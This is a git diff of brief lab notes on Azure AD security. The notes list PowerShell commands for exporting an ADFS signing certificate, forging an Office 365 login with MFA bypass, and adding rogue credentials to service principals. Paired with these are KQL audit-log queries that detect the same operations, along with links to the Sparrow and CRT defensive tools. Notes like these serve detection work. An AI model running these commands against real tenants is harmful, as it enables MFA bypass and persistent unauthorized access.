@@ -1,10 +1,8 @@
 # AzureAD Security 
 
-Quick notes on Azure AD security  
+Quick notes from lab on Azure AD security  
 
-## Setting up a lab
-
-## Attacks
+## Attack
 
 ### Export ADFS certificate
 Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  
@@ -30,6 +28,7 @@ get-msoluser | select UserPrincipalName, ImmutableId
 Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  
 
 (AuditLogs | where OperationName =~ "Set domain authentication")  
+(AuditLogs | where OperationName =~ "Set federation settings on domain" )  
 
 ## Adding credentials to a service principle 
 
@@ -40,10 +39,16 @@ $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING
 New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
 Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  
 
+(AuditLogs | where OperationName =~ "Update service principal")
+(AuditLogs | where OperationName =~ "Add service principal credentials")
+
 ### Password
 New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  
 
-## Create a new service principle 
+(AuditLogs | where OperationName =~ "Update service principal")
+(AuditLogs | where OperationName =~ "Add service principal credentials")
+
+### Create a new service principle 
 Get-AzureADServicePrincipal -all $true | Where-Object{$_.KeyCredentials -ne $null}  
 $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
 
@@ -71,8 +76,11 @@ Microsoft 365 Defender
 Get-AADIntLoginInformation -Domain domain.com  
 Get-AzureADTenantDetail | Select *  
 
-### Sparrow
+### CISA Sparrow
 https://github.com/cisagov/Sparrow/blob/develop/Sparrow.ps1  
 Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing  
+
+### Crowdstrike CRT
+https://github.com/CrowdStrike/CRT/blob/main/Get-CRTReport.ps1
 
 
